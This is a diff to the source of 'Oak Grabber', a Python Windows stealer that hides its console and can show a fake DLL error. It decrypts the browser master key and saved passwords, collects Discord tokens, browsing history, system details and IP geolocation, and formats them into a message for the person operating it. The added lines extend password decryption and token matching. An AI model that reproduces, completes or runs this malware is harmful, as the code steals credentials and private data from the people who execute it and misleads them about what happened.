@@ -11,7 +11,10 @@ fake_error_message = False #displays a fake error message when file ran. (True/F
 error_message = 'The image file C:\WINDOWS\SYSTEM32\XINPUT1_3.dll is valid, but is for a machine type other than the current machine. Select OK to continue, or CANCEL to fail the DLL load.' #custom message here
 
 
+
+
 if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)#hides console faster
+else:pass
 import os, re, json, psutil, random, platform, requests, base64, subprocess, socket, wmi, sqlite3, ntpath, threading, struct, browser_cookie3, uuid, glob, shutil, sys
 from win32crypt import CryptUnprotectData
 from shutil import copy2
@@ -40,6 +43,16 @@ def get_master_key():
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
 masterkey = get_master_key()
+def decrypt_val(buff, master_key) -> str:
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+    except Exception:
+        return "Failed to decrypt password"
 def decrypt_password(buff, master_key):
         try:
             iv, payload = buff[3:15], buff[15:]
@@ -80,6 +93,7 @@ def main():
             ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
     os.chdir(roaming+ "/OakGrabber")
     if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
     ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
     gr = requests.get("https://ipinfo.io/json")
     if gr.status_code == 200:
@@ -133,6 +147,7 @@ def main():
      message = '@everyone **someone ran ur Oak Grabber**'
     else:
      message = '**someone ran ur Oak Grabber**'
+    embedMsg = "**someone ran ur Oak Grabber**\n\n**Tokens:** "
     for platforrm, path in default_paths.items():
         if not os.path.exists(path):
             continue
@@ -146,6 +161,7 @@ def main():
                 embedMsg += f"**Token:** ```{token}```"
         else:
             embedMsg = '```No tokens found.```'
+
 
     headers = {
         'Content-Type': 'application/json',
@@ -255,10 +271,9 @@ def main():
                 os.remove("Historyvault.db")
     def sysinfo():
         tree = fr'''System Info  | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber
-
 HWID: {hardwareid}
 RAM: {ramg} GB
-Architecture: {ee} bit 
+Architecture: {ee} bit
 Username: {pc_username}
 {about}
 Platform: {platform}
@@ -272,7 +287,6 @@ Model name: {mn}
 Build manufacturer: {bm}
 Resolution: {size}
 Path: {idk}
-
 IP INFO
 IP: {ip}
 City: {city}
@@ -282,7 +296,6 @@ GoogleMaps: {googlemap}
 Service provider: {org}
 MAC: {mac}
 Coordinates: {loc}
-
 Processes running
 {ps}'''
         with open("sysinfo.txt", 'w') as fp:
